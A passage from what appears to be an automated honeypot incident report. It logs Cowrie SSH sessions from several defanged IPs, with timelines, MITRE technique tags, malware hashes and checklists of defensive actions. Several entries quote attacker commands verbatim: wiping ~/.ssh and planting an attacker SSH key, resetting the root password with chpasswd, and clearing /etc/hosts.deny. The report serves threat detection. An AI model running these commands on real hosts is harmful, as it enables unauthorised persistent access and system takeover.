| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:44` | `cowrie.session.connect` |
| `2026-06-01 05:33:44` | `cowrie.client.version` |
| `2026-06-01 05:33:44` | `cowrie.client.kex` |
| `2026-06-01 05:33:45` | `cowrie.login.success` |
| `2026-06-01 05:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a898114be4f

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:52` | `cowrie.session.connect` |
| `2026-06-01 05:33:52` | `cowrie.client.version` |
| `2026-06-01 05:33:52` | `cowrie.client.kex` |
| `2026-06-01 05:33:53` | `cowrie.login.success` |
| `2026-06-01 05:33:53` | `cowrie.session.params` |
| `2026-06-01 05:33:53` | `cowrie.command.input` |
| `2026-06-01 05:33:53` | `cowrie.command.failed` |
| `2026-06-01 05:33:54` | `cowrie.log.closed` |
| `2026-06-01 05:33:54` | `cowrie.session.params` |
| `2026-06-01 05:33:54` | `cowrie.command.input` |
| `2026-06-01 05:33:54` | `cowrie.session.file_download` |
| `2026-06-01 05:33:54` | `cowrie.log.closed` |
| `2026-06-01 05:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-487500d5ca3a

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:33 |
| **Last Seen** | 2026-06-01 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:33:57` | `cowrie.session.connect` |
| `2026-06-01 05:33:57` | `cowrie.client.version` |
| `2026-06-01 05:33:57` | `cowrie.client.kex` |
| `2026-06-01 05:33:58` | `cowrie.login.success` |
| `2026-06-01 05:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36d621687e4

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:34 |
| **Last Seen** | 2026-06-01 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:34:28` | `cowrie.session.connect` |
| `2026-06-01 05:34:28` | `cowrie.client.version` |
| `2026-06-01 05:34:28` | `cowrie.client.kex` |
| `2026-06-01 05:34:29` | `cowrie.login.success` |
| `2026-06-01 05:34:29` | `cowrie.session.params` |
| `2026-06-01 05:34:29` | `cowrie.command.input` |
| `2026-06-01 05:34:29` | `cowrie.command.failed` |
| `2026-06-01 05:34:29` | `cowrie.log.closed` |
| `2026-06-01 05:34:29` | `cowrie.session.params` |
| `2026-06-01 05:34:29` | `cowrie.command.input` |
| `2026-06-01 05:34:29` | `cowrie.session.file_download` |
| `2026-06-01 05:34:29` | `cowrie.log.closed` |
| `2026-06-01 05:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e27d47164a

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:34 |
| **Last Seen** | 2026-06-01 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:34:32` | `cowrie.session.connect` |
| `2026-06-01 05:34:32` | `cowrie.client.version` |
| `2026-06-01 05:34:32` | `cowrie.client.kex` |
| `2026-06-01 05:34:32` | `cowrie.login.success` |
| `2026-06-01 05:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512faf7256e5

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:34 |
| **Last Seen** | 2026-06-01 05:35 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8KwnrTBbJIv8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:34:44` | `cowrie.session.connect` |
| `2026-06-01 05:34:44` | `cowrie.client.version` |
| `2026-06-01 05:34:44` | `cowrie.client.kex` |
| `2026-06-01 05:34:45` | `cowrie.login.success` |
| `2026-06-01 05:34:45` | `cowrie.session.params` |
| `2026-06-01 05:34:45` | `cowrie.command.input` |
| `2026-06-01 05:34:45` | `cowrie.command.failed` |
| `2026-06-01 05:34:46` | `cowrie.log.closed` |
| `2026-06-01 05:34:46` | `cowrie.session.params` |
| `2026-06-01 05:34:46` | `cowrie.command.input` |
| `2026-06-01 05:34:46` | `cowrie.session.file_download` |
| `2026-06-01 05:34:46` | `cowrie.log.closed` |
| `2026-06-01 05:35:03` | `cowrie.session.params` |
| `2026-06-01 05:35:03` | `cowrie.command.input` |
| `2026-06-01 05:35:03` | `cowrie.log.closed` |
| `2026-06-01 05:35:03` | `cowrie.session.params` |
| `2026-06-01 05:35:03` | `cowrie.command.input` |
| `2026-06-01 05:35:04` | `cowrie.log.closed` |
| `2026-06-01 05:35:04` | `cowrie.session.params` |
| `2026-06-01 05:35:04` | `cowrie.command.input` |
| `2026-06-01 05:35:04` | `cowrie.session.file_download` |
| `2026-06-01 05:35:04` | `cowrie.log.closed` |
| `2026-06-01 05:35:05` | `cowrie.session.params` |
| `2026-06-01 05:35:05` | `cowrie.command.input` |
| `2026-06-01 05:35:05` | `cowrie.log.closed` |
| `2026-06-01 05:35:06` | `cowrie.session.params` |
| `2026-06-01 05:35:06` | `cowrie.command.input` |
| `2026-06-01 05:35:06` | `cowrie.log.closed` |
| `2026-06-01 05:35:06` | `cowrie.session.params` |
| `2026-06-01 05:35:06` | `cowrie.command.input` |
| `2026-06-01 05:35:06` | `cowrie.command.input` |
| `2026-06-01 05:35:07` | `cowrie.log.closed` |
| `2026-06-01 05:35:07` | `cowrie.session.params` |
| `2026-06-01 05:35:07` | `cowrie.command.input` |
| `2026-06-01 05:35:08` | `cowrie.log.closed` |
| `2026-06-01 05:35:08` | `cowrie.session.params` |
| `2026-06-01 05:35:08` | `cowrie.command.input` |
| `2026-06-01 05:35:08` | `cowrie.log.closed` |
| `2026-06-01 05:35:09` | `cowrie.session.params` |
| `2026-06-01 05:35:09` | `cowrie.command.input` |
| `2026-06-01 05:35:09` | `cowrie.log.closed` |
| `2026-06-01 05:35:09` | `cowrie.session.params` |
| `2026-06-01 05:35:09` | `cowrie.command.input` |
| `2026-06-01 05:35:10` | `cowrie.log.closed` |
| `2026-06-01 05:35:10` | `cowrie.session.params` |
| `2026-06-01 05:35:10` | `cowrie.command.input` |
| `2026-06-01 05:35:11` | `cowrie.log.closed` |
| `2026-06-01 05:35:11` | `cowrie.session.params` |
| `2026-06-01 05:35:11` | `cowrie.command.input` |
| `2026-06-01 05:35:11` | `cowrie.log.closed` |
| `2026-06-01 05:35:12` | `cowrie.session.params` |
| `2026-06-01 05:35:12` | `cowrie.command.input` |
| `2026-06-01 05:35:12` | `cowrie.log.closed` |
| `2026-06-01 05:35:13` | `cowrie.session.params` |
| `2026-06-01 05:35:13` | `cowrie.command.input` |
| `2026-06-01 05:35:13` | `cowrie.log.closed` |
| `2026-06-01 05:35:13` | `cowrie.session.params` |
| `2026-06-01 05:35:13` | `cowrie.command.input` |
| `2026-06-01 05:35:14` | `cowrie.log.closed` |
| `2026-06-01 05:35:14` | `cowrie.session.params` |
| `2026-06-01 05:35:14` | `cowrie.command.input` |
| `2026-06-01 05:35:14` | `cowrie.log.closed` |
| `2026-06-01 05:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c258db2bc654

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:36 |
| **Last Seen** | 2026-06-01 05:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:36:55` | `cowrie.session.connect` |
| `2026-06-01 05:36:55` | `cowrie.client.version` |
| `2026-06-01 05:36:56` | `cowrie.client.kex` |
| `2026-06-01 05:36:57` | `cowrie.login.success` |
| `2026-06-01 05:36:57` | `cowrie.session.params` |
| `2026-06-01 05:36:57` | `cowrie.command.input` |
| `2026-06-01 05:36:57` | `cowrie.command.failed` |
| `2026-06-01 05:36:58` | `cowrie.log.closed` |
| `2026-06-01 05:36:58` | `cowrie.session.params` |
| `2026-06-01 05:36:58` | `cowrie.command.input` |
| `2026-06-01 05:36:58` | `cowrie.session.file_download` |
| `2026-06-01 05:36:58` | `cowrie.log.closed` |
| `2026-06-01 05:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470958b035fa

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:37 |
| **Last Seen** | 2026-06-01 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:37:04` | `cowrie.session.connect` |
| `2026-06-01 05:37:04` | `cowrie.client.version` |
| `2026-06-01 05:37:04` | `cowrie.client.kex` |
| `2026-06-01 05:37:05` | `cowrie.login.success` |
| `2026-06-01 05:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51c152d685f

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:37 |
| **Last Seen** | 2026-06-01 05:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:37:50` | `cowrie.session.connect` |
| `2026-06-01 05:37:50` | `cowrie.client.version` |
| `2026-06-01 05:37:50` | `cowrie.client.kex` |
| `2026-06-01 05:37:50` | `cowrie.login.success` |
| `2026-06-01 05:37:51` | `cowrie.session.params` |
| `2026-06-01 05:37:51` | `cowrie.command.input` |
| `2026-06-01 05:37:51` | `cowrie.command.failed` |
| `2026-06-01 05:37:51` | `cowrie.log.closed` |
| `2026-06-01 05:37:51` | `cowrie.session.params` |
| `2026-06-01 05:37:51` | `cowrie.command.input` |
| `2026-06-01 05:37:51` | `cowrie.session.file_download` |
| `2026-06-01 05:37:51` | `cowrie.log.closed` |
| `2026-06-01 05:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39c4672ee955

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:37 |
| **Last Seen** | 2026-06-01 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:37:53` | `cowrie.session.connect` |
| `2026-06-01 05:37:53` | `cowrie.client.version` |
| `2026-06-01 05:37:53` | `cowrie.client.kex` |
| `2026-06-01 05:37:54` | `cowrie.login.success` |
| `2026-06-01 05:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354dbe7e90f4

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:38 |
| **Last Seen** | 2026-06-01 05:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:38:57` | `cowrie.session.connect` |
| `2026-06-01 05:38:57` | `cowrie.client.version` |
| `2026-06-01 05:38:57` | `cowrie.client.kex` |
| `2026-06-01 05:38:58` | `cowrie.login.success` |
| `2026-06-01 05:38:58` | `cowrie.session.params` |
| `2026-06-01 05:38:58` | `cowrie.command.input` |
| `2026-06-01 05:38:58` | `cowrie.command.failed` |
| `2026-06-01 05:38:59` | `cowrie.log.closed` |
| `2026-06-01 05:38:59` | `cowrie.session.params` |
| `2026-06-01 05:38:59` | `cowrie.command.input` |
| `2026-06-01 05:38:59` | `cowrie.session.file_download` |
| `2026-06-01 05:38:59` | `cowrie.log.closed` |
| `2026-06-01 05:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13e44292ffef

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:39 |
| **Last Seen** | 2026-06-01 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:39:02` | `cowrie.session.connect` |
| `2026-06-01 05:39:02` | `cowrie.client.version` |
| `2026-06-01 05:39:02` | `cowrie.client.kex` |
| `2026-06-01 05:39:03` | `cowrie.login.success` |
| `2026-06-01 05:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e21dfb323da2

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:43 |
| **Last Seen** | 2026-06-01 05:44 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ECyZn7eMAJqe"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:43:46` | `cowrie.session.connect` |
| `2026-06-01 05:43:46` | `cowrie.client.version` |
| `2026-06-01 05:43:46` | `cowrie.client.kex` |
| `2026-06-01 05:43:47` | `cowrie.login.success` |
| `2026-06-01 05:43:48` | `cowrie.session.params` |
| `2026-06-01 05:43:48` | `cowrie.command.input` |
| `2026-06-01 05:43:48` | `cowrie.command.failed` |
| `2026-06-01 05:43:48` | `cowrie.log.closed` |
| `2026-06-01 05:43:48` | `cowrie.session.params` |
| `2026-06-01 05:43:48` | `cowrie.command.input` |
| `2026-06-01 05:43:49` | `cowrie.session.file_download` |
| `2026-06-01 05:43:49` | `cowrie.log.closed` |
| `2026-06-01 05:44:05` | `cowrie.session.params` |
| `2026-06-01 05:44:05` | `cowrie.command.input` |
| `2026-06-01 05:44:05` | `cowrie.log.closed` |
| `2026-06-01 05:44:06` | `cowrie.session.params` |
| `2026-06-01 05:44:06` | `cowrie.command.input` |
| `2026-06-01 05:44:06` | `cowrie.log.closed` |
| `2026-06-01 05:44:06` | `cowrie.session.params` |
| `2026-06-01 05:44:06` | `cowrie.command.input` |
| `2026-06-01 05:44:07` | `cowrie.session.file_download` |
| `2026-06-01 05:44:07` | `cowrie.log.closed` |
| `2026-06-01 05:44:07` | `cowrie.session.params` |
| `2026-06-01 05:44:07` | `cowrie.command.input` |
| `2026-06-01 05:44:08` | `cowrie.log.closed` |
| `2026-06-01 05:44:08` | `cowrie.session.params` |
| `2026-06-01 05:44:08` | `cowrie.command.input` |
| `2026-06-01 05:44:08` | `cowrie.log.closed` |
| `2026-06-01 05:44:09` | `cowrie.session.params` |
| `2026-06-01 05:44:09` | `cowrie.command.input` |
| `2026-06-01 05:44:09` | `cowrie.command.input` |
| `2026-06-01 05:44:09` | `cowrie.log.closed` |
| `2026-06-01 05:44:09` | `cowrie.session.params` |
| `2026-06-01 05:44:09` | `cowrie.command.input` |
| `2026-06-01 05:44:10` | `cowrie.log.closed` |
| `2026-06-01 05:44:10` | `cowrie.session.params` |
| `2026-06-01 05:44:10` | `cowrie.command.input` |
| `2026-06-01 05:44:11` | `cowrie.log.closed` |
| `2026-06-01 05:44:11` | `cowrie.session.params` |
| `2026-06-01 05:44:11` | `cowrie.command.input` |
| `2026-06-01 05:44:11` | `cowrie.log.closed` |
| `2026-06-01 05:44:12` | `cowrie.session.params` |
| `2026-06-01 05:44:12` | `cowrie.command.input` |
| `2026-06-01 05:44:12` | `cowrie.log.closed` |
| `2026-06-01 05:44:13` | `cowrie.session.params` |
| `2026-06-01 05:44:13` | `cowrie.command.input` |
| `2026-06-01 05:44:13` | `cowrie.log.closed` |
| `2026-06-01 05:44:13` | `cowrie.session.params` |
| `2026-06-01 05:44:13` | `cowrie.command.input` |
| `2026-06-01 05:44:14` | `cowrie.log.closed` |
| `2026-06-01 05:44:14` | `cowrie.session.params` |
| `2026-06-01 05:44:14` | `cowrie.command.input` |
| `2026-06-01 05:44:15` | `cowrie.log.closed` |
| `2026-06-01 05:44:15` | `cowrie.session.params` |
| `2026-06-01 05:44:15` | `cowrie.command.input` |
| `2026-06-01 05:44:15` | `cowrie.log.closed` |
| `2026-06-01 05:44:16` | `cowrie.session.params` |
| `2026-06-01 05:44:16` | `cowrie.command.input` |
| `2026-06-01 05:44:16` | `cowrie.log.closed` |
| `2026-06-01 05:44:16` | `cowrie.session.params` |
| `2026-06-01 05:44:16` | `cowrie.command.input` |
| `2026-06-01 05:44:17` | `cowrie.log.closed` |
| `2026-06-01 05:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
